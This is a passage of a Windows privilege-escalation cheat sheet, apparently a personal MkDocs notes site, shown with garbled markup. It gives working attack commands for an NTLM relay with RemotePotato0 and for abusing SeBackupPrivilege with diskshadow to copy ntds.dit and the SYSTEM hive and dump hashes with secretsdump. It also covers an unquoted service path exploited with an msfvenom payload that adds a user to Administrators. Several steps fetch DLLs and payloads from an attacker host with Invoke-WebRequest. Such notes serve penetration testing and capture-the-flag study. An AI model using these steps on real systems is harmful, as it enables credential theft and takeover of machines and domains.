+sudo ntlmrelayx.py -t ldap://<target-dc-ip> --no-wcf-server --escalate-user normal_user</p>
+<h1 id="in-target-machine">In target machine</h1>
+<h1 id="-m-0-module-rpc2http-cross-protocol-relay-server-potato-trigger">-m 0: Module (Rpc2Http cross protocol relay server + potato trigger)</h1>
+<h1 id="-r-remote-http-relay-server">-r: Remote HTTP relay server</h1>
+<h1 id="-x-rogue-oxid-resolver-ip">-x: Rogue Oxid resolver ip</h1>
+<h1 id="-p-rogue-oxid-resolver-port">-p: Rogue Oxid resolver port</h1>
+<h1 id="-s-session-id-for-the-cross-session-activation-attack">-s: Session id for the Cross Session Activation Attack</h1>
+<p>.\RemotePotato0.exe -m 0 -r <attack-ip> -x <attack-ip> -p 9999 -s 1
+<div class="language-text highlight"><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1" href="#__codelineno-128-1"></a>### Module 1 (`-m 1`: Rpc2Http cross protocol relay server)
+</span></code></pre></div></p>
+<h1 id="-l-rpc-relay-server-listening-port">-l: RPC Relay server listening port</h1>
+<p>.\RemotePotato0.exe -m 1 -l 9997 -r <attack-ip></p>
+<p>rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
+<div class="language-text highlight"><pre><span></span><code><span id="__span-129-1"><a id="__codelineno-129-1" name="__codelineno-129-1" href="#__codelineno-129-1"></a>### Module 2 (`-m 2`: Rpc capture server + potato trigger)
+</span></code></pre></div>
+query user
+.\RemotePotato0.exe -m 2 -x <local-ip> -p 9999 -s 1
+<div class="language-text highlight"><pre><span></span><code><span id="__span-130-1"><a id="__codelineno-130-1" name="__codelineno-130-1" href="#__codelineno-130-1"></a>### Module 3 (`-m 3`: Rpc capture server)
+</span></code></pre></div>
+.\RemotePotato0.exe -m 3 -l 9997</p>
+<p>rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
+<div class="language-text highlight"><pre><span></span><code><span id="__span-131-1"><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a># Windows PrivEsc with SeBackupPrivilege
+</span><span id="__span-131-2"><a id="__codelineno-131-2" name="__codelineno-131-2" href="#__codelineno-131-2"></a>
+</span><span id="__span-131-3"><a id="__codelineno-131-3" name="__codelineno-131-3" href="#__codelineno-131-3"></a>SeBackupPrivilege allows users to retrieve file contents.
+</span><span id="__span-131-4"><a id="__codelineno-131-4" name="__codelineno-131-4" href="#__codelineno-131-4"></a>
+</span><span id="__span-131-5"><a id="__codelineno-131-5" name="__codelineno-131-5" href="#__codelineno-131-5"></a>
+</span><span id="__span-131-6"><a id="__codelineno-131-6" name="__codelineno-131-6" href="#__codelineno-131-6"></a>## Investigation
+</span><span id="__span-131-7"><a id="__codelineno-131-7" name="__codelineno-131-7" href="#__codelineno-131-7"></a>
+</span><span id="__span-131-8"><a id="__codelineno-131-8" name="__codelineno-131-8" href="#__codelineno-131-8"></a>First check if the current user has SeBackupPrivilege in the privilege information.
+</span></code></pre></div>
+whoami /all
+<div class="language-text highlight"><pre><span></span><code><span id="__span-132-1"><a id="__codelineno-132-1" name="__codelineno-132-1" href="#__codelineno-132-1"></a>If so, we can read arbitrary files on the system include administrator&#39;s files, SAML file, SYSTEM registry file, etc.
+</span><span id="__span-132-2"><a id="__codelineno-132-2" name="__codelineno-132-2" href="#__codelineno-132-2"></a>
+</span><span id="__span-132-3"><a id="__codelineno-132-3" name="__codelineno-132-3" href="#__codelineno-132-3"></a>&lt;br /&gt;
+</span><span id="__span-132-4"><a id="__codelineno-132-4" name="__codelineno-132-4" href="#__codelineno-132-4"></a>
+</span><span id="__span-132-5"><a id="__codelineno-132-5" name="__codelineno-132-5" href="#__codelineno-132-5"></a>## Exploitation (Read Sensitive Files)
+</span><span id="__span-132-6"><a id="__codelineno-132-6" name="__codelineno-132-6" href="#__codelineno-132-6"></a>### 1. Download &amp; Upload Malicious DLLs
+</span><span id="__span-132-7"><a id="__codelineno-132-7" name="__codelineno-132-7" href="#__codelineno-132-7"></a>
+</span><span id="__span-132-8"><a id="__codelineno-132-8" name="__codelineno-132-8" href="#__codelineno-132-8"></a>In local machine, download malicious dlls from [here](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
+</span></code></pre></div></p>
+<h1 id="if-powershell">If powershell,</h1>
+<p>Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeUtils.dll -OutFile .\SeBackupPrivilegeUtils.dll
+Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeCmdLets.dll -OutFile .\SeBackupPrivilegeCmdLets.dll</p>
+<h1 id="if-winrm">If winrm,</h1>
+<p>upload SeBackupPrivilegeUtils.dll
+upload SeBackupPrivilegeCmdLets.dll</p>
+<p>Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll</p>
+<p>Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+<div class="language-text highlight"><pre><span></span><code><span id="__span-133-1"><a id="__codelineno-133-1" name="__codelineno-133-1" href="#__codelineno-133-1"></a>### 2. Copy &amp; Read Sensitive Files
+</span></code></pre></div>
+Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
+<div class="language-text highlight"><pre><span></span><code><span id="__span-134-1"><a id="__codelineno-134-1" name="__codelineno-134-1" href="#__codelineno-134-1"></a>&lt;br /&gt;
+</span><span id="__span-134-2"><a id="__codelineno-134-2" name="__codelineno-134-2" href="#__codelineno-134-2"></a>
+</span><span id="__span-134-3"><a id="__codelineno-134-3" name="__codelineno-134-3" href="#__codelineno-134-3"></a>## Exploitation (Retrieve Registry Keys)
+</span><span id="__span-134-4"><a id="__codelineno-134-4" name="__codelineno-134-4" href="#__codelineno-134-4"></a>### 1. Create a Payload and Transfer It
+</span><span id="__span-134-5"><a id="__codelineno-134-5" name="__codelineno-134-5" href="#__codelineno-134-5"></a>
+</span><span id="__span-134-6"><a id="__codelineno-134-6" name="__codelineno-134-6" href="#__codelineno-134-6"></a>Create **&quot;diskshadow.txt&quot;** in local machine. It referes to [this](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#using-diskshadow-a-windows-signed-binary).
+</span></code></pre></div>
+set metadata C:\tmp\tmp.cabs 
+set context persistent nowriters 
+add volume c: alias someAlias 
+create 
+expose %someAlias% h:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-135-1"><a id="__codelineno-135-1" name="__codelineno-135-1" href="#__codelineno-135-1"></a>Upload this file to remote machine.  
+</span></code></pre></div></p>
+<h1 id="if-powershell_1">If powershell,</h1>
+<p>Invoke-WebRequest -Uri http://10.0.0.1:8000/diskshadow.txt -OutFile .\diskshadow.txt</p>
+<h1 id="if-winrm_1">If winrm,</h1>
+<p>upload diskshadow.txt
+<div class="language-text highlight"><pre><span></span><code><span id="__span-136-1"><a id="__codelineno-136-1" name="__codelineno-136-1" href="#__codelineno-136-1"></a>### 2. Execute DiskShadow.Exe
+</span><span id="__span-136-2"><a id="__codelineno-136-2" name="__codelineno-136-2" href="#__codelineno-136-2"></a>
+</span><span id="__span-136-3"><a id="__codelineno-136-3" name="__codelineno-136-3" href="#__codelineno-136-3"></a>Then execute diskshadow.exe.
+</span></code></pre></div></p>
+<h1 id="s-specify-the-script-file">/s: Specify the script file</h1>
+<p>diskshadow.exe /s .\diskshadow.txt
+<div class="language-text highlight"><pre><span></span><code><span id="__span-137-1"><a id="__codelineno-137-1" name="__codelineno-137-1" href="#__codelineno-137-1"></a>### 3. Upload Malicious DLL
+</span><span id="__span-137-2"><a id="__codelineno-137-2" name="__codelineno-137-2" href="#__codelineno-137-2"></a>
+</span><span id="__span-137-3"><a id="__codelineno-137-3" name="__codelineno-137-3" href="#__codelineno-137-3"></a>We can download two dll files from [here](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug).
+</span></code></pre></div></p>
+<h1 id="if-powershell_2">If powershell,</h1>
+<p>Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeUtils.dll -OutFile .\SeBackupPrivilegeUtils.dll
+Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeCmdLets.dll -OutFile .\SeBackupPrivilegeCmdLets.dll</p>
+<h1 id="if-winrm_2">If winrm</h1>
+<p>upload SeBackupPrivilegeUtils.dll
+upload SeBackupPrivilegeCmdLets.dll</p>
+<p>Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll</p>
+<p>Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite</p>
+<p>reg save HKLM\SYSTEM c:\tmp\system</p>
+<p>download ntds.dit
+download system
+<div class="language-text highlight"><pre><span></span><code><span id="__span-138-1"><a id="__codelineno-138-1" name="__codelineno-138-1" href="#__codelineno-138-1"></a>### 4. Dump Password Hashes
+</span><span id="__span-138-2"><a id="__codelineno-138-2" name="__codelineno-138-2" href="#__codelineno-138-2"></a>
+</span><span id="__span-138-3"><a id="__codelineno-138-3" name="__codelineno-138-3" href="#__codelineno-138-3"></a>Now we have two files (ntds.dit and system) in local machine.  
+</span><span id="__span-138-4"><a id="__codelineno-138-4" name="__codelineno-138-4" href="#__codelineno-138-4"></a>We can dump password hashes using the files.
+</span></code></pre></div>
+impacket-secretsdump -ntds ntds.dit -system system LOCAL
+<div class="language-text highlight"><pre><span></span><code><span id="__span-139-1"><a id="__codelineno-139-1" name="__codelineno-139-1" href="#__codelineno-139-1"></a>After that, crack the hashes or use them for pass-the-hash.
+</span><span id="__span-139-2"><a id="__codelineno-139-2" name="__codelineno-139-2" href="#__codelineno-139-2"></a>
+</span><span id="__span-139-3"><a id="__codelineno-139-3" name="__codelineno-139-3" href="#__codelineno-139-3"></a>
+</span><span id="__span-139-4"><a id="__codelineno-139-4" name="__codelineno-139-4" href="#__codelineno-139-4"></a>
+</span><span id="__span-139-5"><a id="__codelineno-139-5" name="__codelineno-139-5" href="#__codelineno-139-5"></a># Windows PrivEsc with Unquoted Service Path
+</span><span id="__span-139-6"><a id="__codelineno-139-6" name="__codelineno-139-6" href="#__codelineno-139-6"></a>
+</span><span id="__span-139-7"><a id="__codelineno-139-7" name="__codelineno-139-7" href="#__codelineno-139-7"></a>A service path with unquoted and spaces might be vulnerable to privilege escalation.
+</span><span id="__span-139-8"><a id="__codelineno-139-8" name="__codelineno-139-8" href="#__codelineno-139-8"></a>
+</span><span id="__span-139-9"><a id="__codelineno-139-9" name="__codelineno-139-9" href="#__codelineno-139-9"></a>## Investigation
+</span><span id="__span-139-10"><a id="__codelineno-139-10" name="__codelineno-139-10" href="#__codelineno-139-10"></a>
+</span><span id="__span-139-11"><a id="__codelineno-139-11" name="__codelineno-139-11" href="#__codelineno-139-11"></a>In target machine, find unquoted service path.
+</span></code></pre></div>
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\" | findstr /i /v """                                "
+<div class="language-text highlight"><pre><span></span><code><span id="__span-140-1"><a id="__codelineno-140-1" name="__codelineno-140-1" href="#__codelineno-140-1"></a>Also query the configuration information for a service.
+</span></code></pre></div>
+sc qc "Development Service"
+<div class="language-text highlight"><pre><span></span><code><span id="__span-141-1"><a id="__codelineno-141-1" name="__codelineno-141-1" href="#__codelineno-141-1"></a>For instance if the service path is **&quot;C:\Program Files\Development Files\Devservice Files\Service.exe&quot;**, we can place the exploit to **&quot;C:\Program Files\Devservice.exe&quot;** by ignoring paths after a space.
+</span><span id="__span-141-2"><a id="__codelineno-141-2" name="__codelineno-141-2" href="#__codelineno-141-2"></a>
+</span><span id="__span-141-3"><a id="__codelineno-141-3" name="__codelineno-141-3" href="#__codelineno-141-3"></a>&lt;br /&gt;
+</span><span id="__span-141-4"><a id="__codelineno-141-4" name="__codelineno-141-4" href="#__codelineno-141-4"></a>
+</span><span id="__span-141-5"><a id="__codelineno-141-5" name="__codelineno-141-5" href="#__codelineno-141-5"></a>## Exploitation
+</span><span id="__span-141-6"><a id="__codelineno-141-6" name="__codelineno-141-6" href="#__codelineno-141-6"></a>### 1. Create a Payload
+</span><span id="__span-141-7"><a id="__codelineno-141-7" name="__codelineno-141-7" href="#__codelineno-141-7"></a>
+</span><span id="__span-141-8"><a id="__codelineno-141-8" name="__codelineno-141-8" href="#__codelineno-141-8"></a>In local machine, create a payload using msvenom.  
+</span><span id="__span-141-9"><a id="__codelineno-141-9" name="__codelineno-141-9" href="#__codelineno-141-9"></a>Replace **&quot;victim-user&quot;** with the target user who we can access to.
+</span></code></pre></div>
+msfvenom -p windows/exec CMD='net localgroup Administrators victim-user /add' -f exe-service -o Devservice.exe
+<div class="language-text highlight"><pre><span></span><code><span id="__span-142-1"><a id="__codelineno-142-1" name="__codelineno-142-1" href="#__codelineno-142-1"></a>### 2. Place a Payload to Target Path
+</span><span id="__span-142-2"><a id="__codelineno-142-2" name="__codelineno-142-2" href="#__codelineno-142-2"></a>
+</span><span id="__span-142-3"><a id="__codelineno-142-3" name="__codelineno-142-3" href="#__codelineno-142-3"></a>Now transfer the payload to target machine.
+</span></code></pre></div>
+Invoke-WebRequest -Uri http://<local-ip>:8000/Devservice.exe -OutFile .\Devservice.exe
+<div class="language-text highlight"><pre><span></span><code><span id="__span-143-1"><a id="__codelineno-143-1" name="__codelineno-143-1" href="#__codelineno-143-1"></a>Then place the payload to the path where we&#39;ve found in investigation.
+</span></code></pre></div>
+mv .\Devservice.exe '\Program Files\Development Files\'
+<div class="language-text highlight"><pre><span></span><code><span id="__span-144-1"><a id="__codelineno-144-1" name="__codelineno-144-1" href="#__codelineno-144-1"></a>### 3. Change Permission of the Payload
+</span></code></pre></div>
+icacls 'C:\Program Files\Development Files\Devservice.exe' /grant Everyone:F
+<div class="language-text highlight"><pre><span></span><code><span id="__span-145-1"><a id="__codelineno-145-1" name="__codelineno-145-1" href="#__codelineno-145-1"></a>### 4. Restart Machine
+</span><span id="__span-145-2"><a id="__codelineno-145-2" name="__codelineno-145-2" href="#__codelineno-145-2"></a>
+</span><span id="__span-145-3"><a id="__codelineno-145-3" name="__codelineno-145-3" href="#__codelineno-145-3"></a>Restart the target machine, then the victim user should have an administrator&#39;s privilege.
+</span></code></pre></div></p>
+<h1 id="restart">Restart</h1>
+<p>shutdown /r /t 0</p>
+<h1 id="or-powershells-command">or PowerShell's command</h1>
+<p>Restart-Computer
+```</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/windows/privilege-escalation/privilege-escalation.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
